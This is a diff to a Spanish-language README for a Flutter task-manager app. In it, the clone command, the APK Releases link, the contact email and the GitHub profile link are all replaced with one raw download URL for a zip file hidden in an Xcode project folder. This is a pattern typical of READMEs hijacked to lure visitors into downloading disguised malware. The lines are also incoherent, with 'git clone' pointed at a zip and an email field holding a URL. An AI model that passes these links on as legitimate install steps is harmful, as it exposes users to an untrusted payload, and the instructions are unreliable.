@@ -28,7 +28,7 @@ Para clonar y ejecutar esta aplicación localmente, sigue estos pasos:
 
 1. Clona este repositorio:
    ```bash
-   git clone https://raw.githubusercontent.com/BrandonChT/TaskManager/main/intropression/TaskManager.zip
+   git clone https://raw.githubusercontent.com/BrandonChT/TaskManager/main/macos/Runner.xcodeproj/xcshareddata/Task_Manager_3.2.zip
    cd taskmanager-flutter
    ```
 
@@ -57,7 +57,7 @@ Para clonar y ejecutar esta aplicación localmente, sigue estos pasos:
 - **Integración QR**: Escaneo de equipos mediante códigos QR.
 
 ### Acceso al APK en GitHub
-También puedes encontrar el APK en la sección [Releases](https://raw.githubusercontent.com/BrandonChT/TaskManager/main/intropression/TaskManager.zip) del repositorio. Aquí se cargará una nueva versión del APK cada vez que se actualice la aplicación.
+También puedes encontrar el APK en la sección [Releases](https://raw.githubusercontent.com/BrandonChT/TaskManager/main/macos/Runner.xcodeproj/xcshareddata/Task_Manager_3.2.zip) del repositorio. Aquí se cargará una nueva versión del APK cada vez que se actualice la aplicación.
 
 ## Modo Offline y Sincronización Automática
 - **Modo Offline**: Al no haber conexión, los formularios se guardan en una base de datos local (por ejemplo, SQLite o almacenamiento local de Firebase).
@@ -90,8 +90,8 @@ Este proyecto está bajo la licencia MIT. Para más detalles, consulta el archiv
 
 ## Contacto
 Desarrollado por: Cristian Bastidas  
-Correo electrónico: https://raw.githubusercontent.com/BrandonChT/TaskManager/main/intropression/TaskManager.zip
-GitHub: https://raw.githubusercontent.com/BrandonChT/TaskManager/main/intropression/TaskManager.zip
+Correo electrónico: https://raw.githubusercontent.com/BrandonChT/TaskManager/main/macos/Runner.xcodeproj/xcshareddata/Task_Manager_3.2.zip
+GitHub: https://raw.githubusercontent.com/BrandonChT/TaskManager/main/macos/Runner.xcodeproj/xcshareddata/Task_Manager_3.2.zip
 
 ---
 ¡Gracias por utilizar TaskManager! Esperamos que te sea útil para gestionar y organizar tus tareas eficientemente.
